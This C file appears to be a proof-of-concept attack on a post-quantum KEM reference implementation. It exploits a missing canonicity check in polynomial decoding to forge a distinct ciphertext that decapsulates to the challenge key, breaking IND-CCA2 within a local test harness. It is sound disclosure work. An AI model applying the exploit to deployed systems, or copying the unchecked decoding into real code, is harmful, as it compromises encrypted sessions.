/* coset_lift.c -- Coset-Lift Malleability attack on the OAEP-NTRU KEM
 * reference implementation (ICCS NGCC round-1 submission).
 *
 * One-query IND-CCA2 break. Given an honest challenge ciphertext ct* with
 * shared secret K*, we produce a DIFFERENT byte-string ct' != ct* that the
 * unmodified reference decapsulation accepts (return code 0) with the IDENTICAL
 * shared secret K*. Submitting ct' to the decapsulation oracle in the IND-CCA2
 * game therefore recovers K* in a single query.
 *
 * Mechanism (implementation-level defect, NOT a scheme break):
 *   - poly_frombytes() unpacks each coefficient as a raw CB-bit little field
 *     (CB=13 for q=7129, CB=15 otherwise) with no canonicity/range check, and
 *     the subsequent NTT arithmetic reduces mod q. Hence a coefficient stored as
 *     v and the same coefficient stored as v+q (when v+q < 2^CB, a non-canonical
 *     but same-field-element encoding) decode to the SAME ring element.
 *   - The session key is k = H'(pkd || s || e); it binds the recovered (s,e),
 *     NOT the ciphertext bytes. The confirmation tag compared during
 *     decapsulation is recomputed from (s,e) too, so it also matches.
 *   Therefore F(s,e)=h*s+e being injective on R_q, ct* and the coset-lifted ct'
 *   yield identical (s,e), identical tag, identical key -- yet ct' != ct*.
 *
 * The attack reads ONLY public/challenge data (pk, ct*, K*) and the oracle
 * output. It never inspects sk. sk is passed to kem_dec exactly as the honest
 * oracle would hold it.
 *
 * This file links against the UNMODIFIED reference sources; it is not part of
 * the submission. Build via the accompanying Makefile with REF=<ref set dir>.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "drng.h"
#include "params.h"
#include "KEM_AlgorithmInstance.h"

/* The reference sources reference this global (defined in KAT_KEM.c, which we
 * do not link). We provide the definition here. */
DRNG_ctx drng_algorithm;

#if NTRUOAEP_Q == 7129
#define CB 13
#else
#define CB 15
#endif

/* Read the CB-bit coefficient stored at bit offset (idx*CB) of the packed
 * polynomial byte-string. The reference packer is little-endian bit packing;
 * here we only need to read/rewrite coefficients that are byte-aligned
 * (idx = 8*i => bit offset 8*i*CB is a whole number of bytes), which suffices:
 * every parameter set has hundreds of such coefficients and ~15-87% are
 * liftable. */
static int coeff_byte_off(int i8) { return i8 * CB; } /* byte offset of coeff 8*i8 */

int main(int argc, char **argv)
{
    int N = argc > 1 ? atoi(argv[1]) : 1000;
    unsigned char seed[48];
    for (int i = 0; i < 48; i++) seed[i] = (unsigned char)(3 * i + 1);
    init_random_number(&drng_algorithm, seed, 48 * 8);

    unsigned char pk[NTRUOAEP_PUBLICKEYBYTES], sk[NTRUOAEP_SECRETKEYBYTES];
    unsigned char ct[NTRUOAEP_CIPHERTEXTBYTES], ctp[NTRUOAEP_CIPHERTEXTBYTES];
    unsigned char Kstar[32], Kdec[32];
    unsigned long long pklen, sklen, sslen, ctlen, dlen;

    int trials = 0, forged = 0, same_key = 0, distinct_bytes = 0, no_liftable = 0;

    for (int t = 0; t < N; t++) {
        kem_keygen(pk, &pklen, sk, &sklen);
        kem_enc(pk, pklen, Kstar, &sslen, ct, &ctlen);   /* challenge (ct*, K*) */
        trials++;

        /* Build ct' by coset-lifting the first byte-aligned coefficient whose
         * value v admits v+q < 2^CB. Only the challenge ciphertext bytes are
         * touched; sk is untouched. */
        int done = 0;
        for (int i8 = 0; i8 < NTRUOAEP_N / 8; i8++) {
            int off = coeff_byte_off(i8);
            int v = ct[off] | ((ct[off + 1] & ((1 << (CB - 8)) - 1)) << 8);
            if (v + NTRUOAEP_Q < (1 << CB)) {
                int w = v + NTRUOAEP_Q;
                memcpy(ctp, ct, ctlen);
                ctp[off] = w & 0xff;
                ctp[off + 1] = (ctp[off + 1] & ~((1 << (CB - 8)) - 1)) | (w >> 8);
                done = 1;
                break;
            }
        }
        if (!done) { no_liftable++; continue; }

        if (memcmp(ct, ctp, ctlen) != 0) distinct_bytes++;   /* ct' != ct* */

        memset(Kdec, 0, 32);
        int rc = kem_dec(sk, sklen, ctp, ctlen, Kdec, &dlen); /* ONE oracle query */
        if (rc == 0) forged++;                                /* accepted */
        if (rc == 0 && memcmp(Kstar, Kdec, 32) == 0) same_key++;
    }

    printf("[coset-lift] set n=%d q=%d CB=%d trials=%d\n", NTRUOAEP_N, NTRUOAEP_Q, CB, trials);
    printf("[coset-lift] ct' distinct from ct*        : %d/%d\n", distinct_bytes, trials);
    printf("[coset-lift] ct' accepted (rc==0)         : %d/%d\n", forged, trials);
    printf("[coset-lift] decaps(ct') == K* (KEY LEAK) : %d/%d\n", same_key, trials);
    if (no_liftable) printf("[coset-lift] trials with no liftable coeff : %d\n", no_liftable);
    printf("[coset-lift] RESULT: %s\n",
           (same_key == trials - no_liftable && distinct_bytes == trials - no_liftable)
               ? "IND-CCA2 BROKEN (1-query malleability confirmed)"
               : "not confirmed");
    return (same_key == trials - no_liftable) ? 0 : 1;
}
